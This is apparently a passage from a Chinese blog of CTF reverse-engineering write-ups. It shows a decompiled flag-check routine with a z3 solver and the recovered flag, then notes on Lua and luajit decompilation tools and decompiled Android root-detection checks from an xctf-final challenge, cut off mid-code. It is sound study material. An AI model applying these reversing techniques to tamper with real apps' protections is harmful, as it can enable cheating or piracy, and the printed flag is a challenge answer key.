class="line">  local_8 = some;</span><br><span class="line">                    /* <span class="number">114</span>!<span class="number">514</span>! */</span><br><span class="line">  sVar3 = strlen(some);</span><br><span class="line">  <span class="keyword">if</span> (sVar3 &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    local_4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; uVar2 = i, sVar3 = strlen(input_str), uVar2 &lt; sVar3; i = i + <span class="number">8</span>) &#123;</span><br><span class="line">      local_48 = <span class="number">0</span>;</span><br><span class="line">      local_50 = <span class="number">0</span>;</span><br><span class="line">      local_58 = <span class="number">0</span>;</span><br><span class="line">      array = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j = j + <span class="number">1</span>) &#123;</span><br><span class="line">        *(uint *)((<span class="built_in">int</span>)&amp;array + j * <span class="number">4</span>) = (<span class="built_in">int</span>)(char)(local_8[j] ^ input_str[j + i]) &amp; <span class="number">0xff</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">114</span>; k = k + <span class="number">1</span>) &#123;</span><br><span class="line">        do_something((<span class="built_in">int</span> *)&amp;array,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">        do_something((<span class="built_in">int</span> *)&amp;array,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line">        do_something((<span class="built_in">int</span> *)&amp;array,<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">        do_something((<span class="built_in">int</span> *)&amp;array,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (l = <span class="number">0</span>; l &lt; <span class="number">8</span>; l = l + <span class="number">1</span>) &#123;</span><br><span class="line">        bVar1 = true;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">0</span>) &#123;</span><br><span class="line">          bVar1 = *(char *)((<span class="built_in">int</span>)&amp;local_30 + *(<span class="built_in">int</span> *)((<span class="built_in">int</span>)&amp;array + l * <span class="number">4</span>) / <span class="number">0x10</span>) ==</span><br><span class="line">                  *(char *)(local_10 + (l + i) * <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        flag = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!bVar1) &#123;</span><br><span class="line">          flag = (uint)(*(char *)((<span class="built_in">int</span>)&amp;local_30 + *(<span class="built_in">int</span> *)((<span class="built_in">int</span>)&amp;array + l * <span class="number">4</span>) % <span class="number">0x10</span>) ==</span><br><span class="line">                       *(char *)(local_10 + (l + i) * <span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_4 = flag;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> local_4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致逻辑就是先让flag和key异或，然后进入do_somthing进行114次操作，接下来是把值转成16进制来对比，z3可以解，不过时间很长，需要等待，差点就ctrl+z了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">s=Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&quot;flag%d&quot;</span> % i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_something</span>(<span class="params">arr,in1,in2,in3,in4</span>):</span><br><span class="line">    arr[in4] = (arr[in4] ^ arr[in1] + arr[in3]) &amp; <span class="number">0xFF</span></span><br><span class="line">    arr[in3] = (arr[in3] ^ arr[in1] + arr[in2]) &amp; <span class="number">0xFF</span></span><br><span class="line">    arr[in2] = (arr[in2] ^ arr[in3] + arr[in4]) &amp; <span class="number">0xFF</span></span><br><span class="line">    arr[in1] = (arr[in1] ^ arr[in2] + arr[in4]) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">str_1 = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">tmp = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="built_in">hash</span> = <span class="string">&quot;91fba5ccfef6e0905eeeb47940d25543c286b10de778fbb268ab7580414c0758&quot;</span></span><br><span class="line">hash1 = [<span class="number">0x91</span>,<span class="number">0xfb</span>,<span class="number">0xa5</span>,<span class="number">0xcc</span>,<span class="number">0xfe</span>,<span class="number">0xf6</span>,<span class="number">0xe0</span>,<span class="number">0x90</span>,<span class="number">0x5e</span>,<span class="number">0xee</span>,<span class="number">0xb4</span>,<span class="number">0x79</span>,<span class="number">0x40</span>,<span class="number">0xd2</span>,<span class="number">0x55</span>,<span class="number">0x43</span>,<span class="number">0xc2</span>,<span class="number">0x86</span>,<span class="number">0xb1</span>,<span class="number">0x0d</span>,<span class="number">0xe7</span>,<span class="number">0x78</span>,<span class="number">0xfb</span>,<span class="number">0xb2</span>,<span class="number">0x68</span>,<span class="number">0xab</span>,<span class="number">0x75</span>,<span class="number">0x80</span>,<span class="number">0x41</span>,<span class="number">0x4c</span>,<span class="number">0x07</span>,<span class="number">0x58</span>]</span><br><span class="line">key = <span class="string">&quot;114!514!&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">8</span>):</span><br><span class="line">    arr = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        arr[j] = <span class="built_in">ord</span>(key[j]) ^ flag[i + j]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">114</span>):</span><br><span class="line">        do_something(arr,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">        do_something(arr,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">        do_something(arr,<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">        do_something(arr,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        tmp[ii + i] = arr[ii]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    s.add(tmp[i]&amp;<span class="number">0xff</span> == hash1[i])</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res.append(<span class="built_in">chr</span>(m[flag[i]].as_long()))</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;nope&quot;</span>)   </span><br><span class="line"><span class="comment">#print(v5)</span></span><br><span class="line"><span class="comment">#flag&#123;Y0u_Kn0w_W45M_n0w!!W0oO0ow&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个太难爆了，爆了几分钟，幸好中间去找哥们唠嗑了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2023/04/04/xctf-final-SuperFlagio/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/04/xctf-final-SuperFlagio/" class="post-title-link" itemprop="url">xctf-final-SuperFlagio</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-04 17:04:26" itemprop="dateCreated datePublished" datetime="2023-04-04T17:04:26+08:00">2023-04-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-04-11 23:22:41" itemprop="dateModified" datetime="2023-04-11T23:22:41+08:00">2023-04-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SuperFlagio"><a href="#SuperFlagio" class="headerlink" title="SuperFlagio"></a>SuperFlagio</h1><p>在做xctf决赛的题时，明显感觉跟平常的题不是一个等级，当时选了lambda来做，发现并不是很好做，那个题真就做了一天，赛后复现一下SuperFlagio这个题。</p>
<h2 id="所需知识"><a href="#所需知识" class="headerlink" title="所需知识"></a>所需知识</h2><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><p>lua是小巧脚本语言。其设计目的是为了通过灵活嵌入应用程序中从而为应用程序提供灵活的扩展和定制功能。</p>
<p>lua，luac，luajit三种文件区别：</p>
<p>lua是明文代码，可看见代码</p>
<p>luac是lua编译后的字节码，头文件为0x1B 0X4C 0X75 0X61 版本号构成</p>
<p>lua虚拟机能够直接解析lua和luac脚本文件，而luajit是另一个文件lua的实现版本，luajit比lua和luac更高效，文件头是0X18 0X4C 0X4A</p>
<h3 id="lua符号恢复"><a href="#lua符号恢复" class="headerlink" title="lua符号恢复"></a>lua符号恢复</h3><p>首先搜索到lua版本，然后编译对应版本</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">curl</span> -R -O http://www.lua.org/ftp/lua-<span class="number">5</span>.<span class="number">3</span>.<span class="number">4</span>.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="attribute">tar</span> zxf lua-<span class="number">5</span>.<span class="number">3</span>.<span class="number">4</span>.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="attribute">cd</span> lua-<span class="number">5</span>.<span class="number">3</span>.<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">sudo</span> make linux test</span><br><span class="line"></span><br><span class="line"><span class="attribute">sudo</span> make install</span><br></pre></td></tr></table></figure>

<p>编译完成在bin文件中找到lua文件，然后ida载入lua，关闭并保存得到i64，然后打开要恢复的lua文件，ctrl+6打开bindiff，选择diff database，将confidence和similarity全部改成0.5，点ok，然后再点ctrl+6，恢复成功。</p>
<h3 id="luac反编译"><a href="#luac反编译" class="headerlink" title="luac反编译"></a>luac反编译</h3><h4 id="unluac"><a href="#unluac" class="headerlink" title="unluac"></a>unluac</h4><p>unluac1.2.2.155是比较稳定的一个版本，命令：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span>unluac.<span class="keyword">jar </span>main.luac</span><br></pre></td></tr></table></figure>



<h4 id="luadec"><a href="#luadec" class="headerlink" title="luadec"></a>luadec</h4><p>安装luadec方法：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.<span class="keyword">com</span>/viruscamp/luadec</span><br><span class="line"><span class="keyword">cd</span> luadec</span><br><span class="line">git submodule <span class="keyword">update</span> --init <span class="keyword">lua</span>-<span class="number">5.1</span></span><br><span class="line"><span class="keyword">cd</span> <span class="keyword">lua</span>-<span class="number">5.1</span></span><br><span class="line"><span class="keyword">make</span> linux</span><br><span class="line"><span class="keyword">cd</span> ../luadec</span><br><span class="line"><span class="keyword">make</span> LUAVER=<span class="number">5.1</span></span><br></pre></td></tr></table></figure>

<p>版本切换：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git submodule <span class="keyword">update</span> --init <span class="keyword">lua</span>-<span class="number">5.3</span></span><br><span class="line"><span class="keyword">cd</span> <span class="keyword">lua</span>-<span class="number">5.3</span></span><br><span class="line"><span class="keyword">make</span> linux</span><br><span class="line"><span class="keyword">cd</span> ../luadec</span><br><span class="line"><span class="keyword">make</span> clean</span><br><span class="line"><span class="keyword">make</span> LUAVER=<span class="number">5.3</span></span><br></pre></td></tr></table></figure>

<h3 id="luajit反编译"><a href="#luajit反编译" class="headerlink" title="luajit反编译"></a>luajit反编译</h3><h4 id="luajit-decomp"><a href="#luajit-decomp" class="headerlink" title="luajit-decomp"></a>luajit-decomp</h4><p>推荐使用ljd，还有一种是luajit-decomp不推荐使用（比较难看）</p>
<p>首先确定luajit版本，通过字符串搜索可知。</p>
<p>下载luajit对应版本并编译，直接在文件夹根目录下：</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mingw32-<span class="built_in">make</span></span><br></pre></td></tr></table></figure>

<p>然后复制编译后的LuaJIT-2.1.0-beta2\src路径下的lua51.dll、luajit.exe文件和jit文件夹覆盖到luajit-decomp目录中。将原脚本默认是只反编译当前目录下名为test.lua的文件，所以我们要重命名我们要反编译的文件为test.lua，接着运行decoder_new.exe，最终生成test.asm out.lua out2.lua，out2.lua就是我们要的文件</p>
<h4 id="ljd"><a href="#ljd" class="headerlink" title="ljd"></a>ljd</h4><p>在根目录下使用</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> main.<span class="keyword">py</span> -<span class="keyword">f</span> <span class="symbol">&lt;script_name&gt;</span>.luac64 &gt; <span class="symbol">&lt;script_name&gt;</span>.<span class="keyword">lua</span></span><br></pre></td></tr></table></figure>

<p>即可编译。</p>
<p>luajit如何编译成arm文件？</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/LuaJIT/</span>LuaJIT.git</span><br><span class="line">cd LuaJIT</span><br><span class="line">git checkout v2.<span class="number">1.0</span>-beta3</span><br><span class="line">make -j `nproc`</span><br></pre></td></tr></table></figure>

<p>即可</p>
<p>目前遇到了三种类型的lua题目，第一种是lua加载时魔改了lua chunk，第二种是lua加载魔改opcode，第三种是luajit加载魔改opcode，显然还有一种是luajit加载魔改lua chunk的情况没有出现。</p>
<p>首先给了一个apk文件，用jadx打开发现OnCreate中有很多检测，比如：</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230404170743487.png" alt="image-20230404170743487"></p>
<p>下面是java层，<em>Cocos2dxUtil.lowEngineVersion</em> 对是否root进行检测：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.cocos2dx.lib;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStreamWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cocos2dxUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;org.cocos2dx.lib.Cocos2dxUtil&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">a</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Build.TAGS;</span><br><span class="line">        <span class="keyword">return</span> str != <span class="literal">null</span> &amp;&amp; str.contains(<span class="string">&quot;test-keys&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/system/app/SuperSU/SuperSU.apk&quot;</span>).exists();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">c</span><span class="params">()</span> &#123;</span><br><span class="line">        String[] strArr = &#123;<span class="string">&quot;/system/bin/&quot;</span>, <span class="string">&quot;/system/xbin/&quot;</span>, <span class="string">&quot;/system/sbin/&quot;</span>, <span class="string">&quot;/sbin/&quot;</span>, <span class="string">&quot;/vendor/bin/&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strArr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(strArr[i] + <span class="string">&quot;su&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception unused) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">d</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> j(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/system/xbin/which&quot;</span>, <span class="string">&quot;su&quot;</span>&#125;) != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARNING: Code restructure failed: missing block: B:15:0x001e, code lost:</span></span><br><span class="line"><span class="comment">        return false;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* JADX WARNING: Exception block dominator not found, dom blocks: [] */</span></span><br><span class="line">    <span class="comment">/* Code decompiled incorrectly, please refer to instructions dump. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">e</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            java.lang.Class&lt;org.cocos2dx.lib.Cocos2dxUtil&gt; r0 = org.cocos2dx.lib.Cocos2dxUtil.class</span></span><br><span class="line"><span class="comment">            monitor-enter(r0)</span></span><br><span class="line"><span class="comment">            r1 = 2</span></span><br><span class="line"><span class="comment">            r2 = 0</span></span><br><span class="line"><span class="comment">            java.lang.String[] r1 = new java.lang.String[r1]     // Catch:&#123; Exception -&gt; 0x001d, all -&gt; 0x001a &#125;</span></span><br><span class="line"><span class="comment">            java.lang.String r3 = &quot;busybox&quot;</span></span><br><span class="line"><span class="comment">            r1[r2] = r3     // Catch:&#123; Exception -&gt; 0x001d, all -&gt; 0x001a &#125;</span></span><br><span class="line"><span class="comment">            java.lang.String r3 = &quot;df&quot;</span></span><br><span class="line"><span class="comment">            r4 = 1</span></span><br><span class="line"><span class="comment">            r1[r4] = r3     // Catch:&#123; Exception -&gt; 0x001d, all -&gt; 0x001a &#125;</span></span><br><span class="line"><span class="comment">            java.util.ArrayList r1 = j(r1)     // Catch:&#123; Exception -&gt; 0x001d, all -&gt; 0x001a &#125;</span></span><br><span class="line"><span class="comment">            if (r1 == 0) goto L_0x0018</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r4</span></span><br><span class="line"><span class="comment">        L_0x0018:</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r2</span></span><br><span class="line"><span class="comment">        L_0x001a:</span></span><br><span class="line"><span class="comment">            r1 = move-exception</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            throw r1</span></span><br><span class="line"><span class="comment">        L_0x001d:</span></span><br><span class="line"><span class="comment">            monitor-exit(r0)</span></span><br><span class="line"><span class="comment">            return r2</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Method not decompiled: org.cocos2dx.lib.Cocos2dxUtil.e():boolean&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    